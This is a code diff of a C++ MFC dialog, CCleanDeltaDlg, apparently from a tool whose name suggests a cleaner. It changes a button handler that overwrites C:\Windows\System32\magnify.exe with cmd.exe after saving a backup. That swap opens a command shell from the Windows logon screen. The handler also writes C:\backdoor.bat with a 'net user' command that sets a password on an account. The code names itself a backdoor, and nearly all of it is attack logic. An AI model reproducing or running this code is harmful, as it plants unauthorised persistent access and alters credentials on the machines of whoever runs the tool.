@@ -381,23 +381,28 @@ BOOL CCleanDeltaDlg::StopService(CString Name)
 
 void CCleanDeltaDlg::OnBnClickedButton3()
 {
-	if (PathFileExists(L"C:\\Windows\\System32\\magnify.exe"))
+	if (!PathFileExists(L"C:\\Windows\\System32\\magnify_old.exe"))
 	{
-		system("copy C:\\Windows\\System32\\magnify.exe C:\\Windows\\System32\\magnify_old.exe");
+		if (PathFileExists(L"C:\\Windows\\System32\\magnify.exe"))
+		{
+			system("copy C:\\Windows\\System32\\magnify.exe C:\\Windows\\System32\\magnify_old.exe");
+		}
+
+		if (PathFileExists(L"C:\\Windows\\System32\\cmd.exe"))
+		{
+			system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
+		}
 	}
 
-	if (PathFileExists(L"C:\\Windows\\System32\\cmd.exe"))
-	{
-		system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
-	}
 
-	CStdioFileEx file;
+	CStdioFile file;
 
 	CString  strFullPath = L"C:\\backdoor.bat";
-	if (!file.Open(strFullPath, CFile::modeCreate | CFile::modeWrite | CStdioFileEx::modeWriteUnicode))
+	if (!file.Open(strFullPath, CFile::modeCreate | CFile::modeWrite))
 	{
 		AfxMessageBox(L"Cannot Set backdoor.bat");
 	}
+
 	file.WriteString(L"net user TWLadmin Aa1234");
 	file.Close();
 
